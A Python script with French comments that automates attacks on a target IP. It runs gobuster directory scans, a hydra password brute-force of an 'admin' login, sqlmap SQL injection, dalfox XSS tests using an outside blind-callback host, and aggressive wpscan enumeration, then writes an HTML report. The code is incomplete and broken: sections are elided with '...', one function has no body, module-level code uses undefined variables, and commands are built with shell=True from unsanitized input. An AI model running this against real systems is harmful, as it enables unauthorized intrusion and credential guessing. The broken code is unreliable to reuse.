#!/usr/bin/env python3
import subprocess
import webbrowser
import os
import json
import nmap
import re
import requests
import tkinter as tk
from tkinter import ttk

def run_tool(command, output_file):
    """Exécute une commande et enregistre la sortie dans un fichier."""
    try:
        result = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        with open(output_file, "w") as f:
            f.write(result.stdout)
            if result.stderr:
                f.write("\n--- Erreurs standard ---\n")
                f.write(result.stderr)
    except (subprocess.CalledProcessError, FileNotFoundError) as e:
        with open(output_file, "w") as f:
            f.write(f"Erreur lors de l'exécution de {command}: {e}")

def check_and_install_tool(tool_name, install_command):
    """Vérifie si un outil est installé et l'installe si nécessaire."""
    try:
        subprocess.run([tool_name, "--version"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except FileNotFoundError:
        print(f"{tool_name} non trouvé. Installation en cours...")
        subprocess.run(install_command, shell=True)

def scan_web_directory(ip, port, tool="gobuster"):
    """Scanne les répertoires web sur un port spécifique."""
    output_file = f"web_scan_{ip}_{port}.txt"
    scheme = "https" if port == 443 else "http"
    command = f"{tool} dir -u {scheme}://{ip}:{port} -w /usr/share/wordlists/dirb/common.txt -o {output_file}"
    run_tool(command, output_file)
    return output_file

def bruteforce_login(ip, port, login_page, tool="hydra"):
    """Effectue une attaque par brute-force sur une page de login."""
    output_file = f"bruteforce_{ip}_{port}_{login_page}.txt"
    scheme = "https" if port == 443 else "http"
    command = f"{tool} -l admin -P /usr/share/wordlists/rockyou.txt {ip} {scheme}-post-form '{login_page}' user=^USER^&pass=^PASS^&login=Login -f"
    run_tool(command, output_file)
    return output_file

def test_sql_injection(ip, port, tool="sqlmap"):
    """Teste les vulnérabilités d'injection SQL."""
    output_file = f"sql_injection_{ip}_{port}.txt"
    scheme = "https" if port == 443 else "http"
    command = f"{tool} -u {scheme}://{ip}:{port}/ --forms --batch --level=1"
    run_tool(command, output_file)
    return output_file

def test_xss(ip, port, tool="dalfox"):
    """Teste les vulnérabilités XSS."""
    output_file = f"xss_{ip}_{port}.txt"
    scheme = "https" if port == 443 else "http"
    command = f"{tool} file {output_file} -b hahwul.xss.ht url {scheme}://{ip}:{port}/"
    run_tool(command, output_file)
    return output_file

def scan_wordpress(ip, port, tool="wpscan"):
    """Scanne un site WordPress sur un port spécifique."""
    output_file = f"wpscan_{ip}_{port}.txt"
    scheme = "https" if port == 443 else "http"
    command = f"{tool} --url {scheme}://{ip}:{port} --enumerate vp,vt,cb,dbe,u,tt,m --plugins-detection aggressive --no-update"
    run_tool(command, output_file)
    return output_file

def extract_information(results):
    """Extrait des informations spécifiques des résultats (versions, CVE, etc.)."""
    extracted_info = {}
    for tool, output_file in results.items():
        with open(output_file, "r") as f:
            content = f.read()
            # Exemples d'expressions régulières (à adapter selon vos besoins)
            versions = re.findall(r"(\w+/\d+\.\d+\.\d+)", content)
            cves = re.findall(r"(CVE-\d{4}-\d+)", content)
            extracted_info[tool] = {"versions": versions, "cves": cves}
    return extracted_info

def import_to_dradis(ip, results):
    """Importe les résultats dans Dradis via l'API (à adapter selon votre configuration)."""
    # ... (code d'import Dradis à compléter)

def generate_report(ip, results, extracted_info):
    """Génère un rapport HTML avec les résultats et les informations extraites."""
    report_file = f"rapport_securite_{ip}.html"
    with open(report_file, "w") as f:
        f.write(f"<html><head><title>Rapport de Sécurité - {ip}</title></head><body>")
        f.write(f"<h1>Rapport de Sécurité pour {ip}</h1>")
        for tool, output_file in results.items():
            f.write(f"<h2>{tool}</h2>")
            with open(output_file, "r") as out:
                f.write(f"<pre>{out.read()}</pre>")

        # Ajout des informations extraites au rapport
        f.write("<h2>Informations extraites</h2>")
        for tool, info in extracted_info.items():
            f.write(f"<h3>{tool}</h3>")
            f.write("<ul>")
            for category, values in info.items():
                if values:
                    f.write(f"<li><b>{category}:</b> {', '.join(values)}</li>")
            f.write("</ul>")

        f.write("</body></html>")

    webbrowser.open(f"file://{os.path.realpath(report_file)}")

# ... (vérification et installation des outils, saisie de l'IP, scan Nmap, analyse des ports, scans et tests sur les ports web restent inchangés)

# Après l'exécution des outils
extracted_info = extract_information(results)
generate_report(ip, results, extracted_info)

# Import dans Dradis (à compléter)
# import_to_dradis(ip, results)

# Interface graphique (à compléter)
# ...
